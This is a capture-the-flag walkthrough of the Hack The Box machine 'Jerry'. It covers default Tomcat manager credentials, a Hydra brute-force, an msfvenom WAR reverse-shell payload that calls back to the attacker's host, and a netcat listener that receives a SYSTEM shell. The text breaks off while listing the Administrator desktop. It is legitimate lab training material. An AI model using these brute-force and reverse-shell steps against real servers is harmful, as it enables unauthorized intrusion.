# Overview: 
Jerry is a very easy box that involves finding an Apache Tomcat server and exploiting **Tomcat Web Application Manager** with weak credentials.
We then upload a malicous `.WAR` file to gain a system reverse shell and access to `user` and `root` flags. 
# **Reconnaissance**:
### Nmap:
We will get started as always with an `nmap` scan. 
```bash
sudo nmap -sC -sV -oA ~/htb/boxes/Jerry/nmap 10.10.10.95
...SNIP...
Nmap scan report for 10.10.10.95
Host is up (0.095s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

...SNIP...

```
Running `nmap` we see just one port open on `8080`. This port is running an `Apache Tomcat` webserver version:`7.0.88`.

## Web Enumeration:

Navigating over to `10.10.10.95:8080` we get what appears to be a default webpage.

_Default install of tomcat_

Poking around on the app, we see that `Server Status`, `Manager App`, `Host Manager` require a `username:password`

![image.png](assets/img/Jerry/image_1.png)

Testing the default credentials of `admin:admin` we gain access to the `Server Status` page. Looking around, there doesn’t seem to be any vector to exploit.

Googling around for other default credentials doesn’t seem to net much, but if we observe the `403 - Access Denied` page when attempting to access `Manager App`, we get the following:

![image.png](assets/img/Jerry/image_4.png)
_Suggestion of the `manager` role with the username : password pair of `tomcat:s3cret`_

Trying these credentials, we get access to the *Tomcat Web Application Manager page.*

> In most cases (_we hope_) credentials will not be so easily accessible. To circumvent this, we may need to brute-force the password. 
{: .prompt-tip }

### Bruteforcing:

#### Burpsuite:
We notice capturing the request to `http://10.10.10.95:8080/manager/html` that we have the `Authorization` header, which is a `Base64 encoded` value of the `username:password` that is entered. In this case, we don’t get access with value of `admin:admin`.

![image.png](assets/img/Jerry/image_3.png)

Using this knowledge of the request, we are now informed as to where to direct out brute-forcing attempt. 

#### Hydra:

Using hydra, we find the password `tomcat:s3cret`.

```bash
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
#-C FILE   colon separated "login:pass" format

...SNIP...
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret

```


# **Exploitation:**

## Web Exploitation:

In the **Tomcat Web Application Manager,** we see that we can upload and WAR files.

> A WAR (Web Application Archive) file allows developers to package all the components of a Java-based web application, including code, configuration, and static resources, for deployment on a web server or application server.
{: .prompt-info }


### Creating malicious WAR file:
We use will `msfvenom` to craft an exploit:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=8888 -f war -o upload.war
```
> #### Switches:
- `p java/jsp_shell_reverse_tcp`: Specifies the payload (a reverse shell using Java Server Pages).
- `LHOST=`: Your machine's IP address (for the reverse shell to connect back).
- `LPORT=`: The port on your machine to receive the reverse shell.
- `f war`: Specifies the output format as a WAR file.
- `upload.war`: Output file name.
{: .prompt-info }

### Getting shell:
Navigating to `http://10.10.10.95:8080/upload/`
![image.png](assets/img/Jerry/image_7.png)
_Upload displayed on GUI_


```shell
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.95] 49193

```
### Flags:
We have shell as system, so `user` and `root` flags are easy to get:
```bash
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489
